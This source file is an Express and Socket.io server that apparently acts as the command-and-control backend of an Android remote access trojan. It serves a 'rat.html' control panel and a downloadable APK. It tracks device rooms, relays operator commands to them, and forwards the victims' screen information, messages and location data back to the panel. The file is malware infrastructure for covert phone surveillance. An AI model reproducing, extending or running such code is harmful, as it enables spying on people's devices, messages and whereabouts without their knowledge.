
var Express = require("express");


var App = Express()

var PORT = process.env.PORT || 4000;
var http = require("http")


var server = http.createServer(App).listen(PORT)
var socket = require('socket.io')(server)

var path = require('path')



var allrooms =[]




App.get('/',(req,res)=>{
    
    res.sendFile(path.join(__dirname,"\ viewe".trim(),"\ rat.html".trim()))
})





App.post("/id/:mod/:id",(req,res)=>{
    if(req.params.mod == "get"){
        
        res.send(allrooms).status(200)
    }
    else if(req.params.mod == "delet"){
        allrooms = allrooms.filter((value)=>{value != req.params.id})
        res.send(allrooms).status(200)

    }else{
        res.send("in valid mode").status(404)
    }
})



App.get('/apk',(req,res)=>{
    res.sendFile(path.join(__dirname,"\ viewe ".trim(),"\ app-release.apk".trim()))  
})

socket.on('connection',Socket=>{
    console.log(Socket.id)

    Socket.on('cmd',valu=>{
        console.log(valu)
        Socket.to(valu.room).emit('data',valu.data)
    })


//viewe\app-release.apk'
    Socket.on('join_room',(roomid)=>{
         Socket.join(roomid)
         if(!allrooms.some(val=>val == roomid)){
             
             allrooms.push(roomid)
         }
     })


     Socket.on("screeninfo",(room,data)=>{
         
        Socket.to(room).emit("screeninfo", data);
     })

     Socket.on("msg",(room,data)=>{
         
        Socket.to(room).emit("msg", data);
     })

     Socket.on("location",(room,data)=>{
         Socket.to(room).emit("location",data)
     })



    // socket.emit("new message","hi i am server")
    Socket.on('disconnect',()=>{
        console.log("user disconnet")
    })

})